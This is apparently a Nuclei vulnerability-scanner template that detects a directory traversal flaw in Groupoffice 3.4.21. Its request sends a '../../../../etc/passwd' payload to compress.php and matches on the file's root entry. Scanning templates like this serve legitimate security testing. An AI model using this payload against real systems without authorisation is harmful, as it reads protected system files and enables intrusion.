id: groupoffice-lfi

info:
  name: Groupoffice 3.4.21 Directory Traversal Vulnerability
  author: 0x_Akoko
  severity: high
  reference: https://cxsecurity.com/issue/WLB-2018020249
  tags: groupoffice,lfi

requests:
  - method: GET
    path:
      - "{{BaseURL}}/compress.php?file=../../../../../../../etc/passwd"

    matchers-condition: and
    matchers:

      - type: regex
        regex:
          - "root:[x*]:0:0"

      - type: status
        status:
          - 200
